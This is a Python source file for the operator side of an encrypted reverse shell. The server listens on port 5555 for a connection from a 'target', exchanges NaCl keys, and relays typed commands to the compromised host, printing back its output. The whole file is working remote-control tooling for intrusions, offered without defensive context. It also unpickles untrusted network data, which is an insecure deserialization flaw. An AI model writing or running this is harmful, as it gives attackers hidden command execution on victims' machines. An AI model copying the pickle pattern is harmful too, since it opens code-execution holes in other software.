from nacl.public import PrivateKey, Box
from pickle import dumps, loads
from socket import socket
from time import sleep


class Server:

    def __init__(self):
        self.host = '0.0.0.0'
        self.port = 5555
        self.buffer = 1024*1000
        self.socket = None
        self.max_clients = 2
        self.private_key = PrivateKey.generate()
        self.public_key = self.private_key.public_key
        self.client_public_key = None
        self.box = None


    def listen(self):
        try:
            self.socket = socket()
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.max_clients)
            print(f'[*] Listening on port {self.port}')
            self.communicate()
        except Exception as e:
            print(e)
            sleep(5)
            self.listen()

    def communicate(self):
        connection, target_address = self.socket.accept()
        print(f'[*] Connection from {target_address[0]}:{target_address[1]}')
        self.public_key_exchange(connection)
        cwd = connection.recv(self.buffer)
        print(f'{self.box.decrypt(loads(cwd)).decode()} > ', end='')
        while True:
            try:
                command = input()
                connection.send(dumps(self.box.encrypt(command.encode())))
                if command == 'exit':
                    break
                response = connection.recv(self.buffer)
                print(self.box.decrypt(loads(response)).decode(), end='')
            except Exception as e:
                print(e)
        self.socket.close()

    def public_key_exchange(self, conn):
        print('[*] Receiving target public key')
        self.client_public_key = loads(conn.recv(self.buffer))
        self.box = Box(self.private_key, self.client_public_key)
        print('[*] Sending host public key')
        conn.send(dumps(self.public_key))


def main():
    server = Server()
    server.listen()


if __name__ == '__main__':
        main()


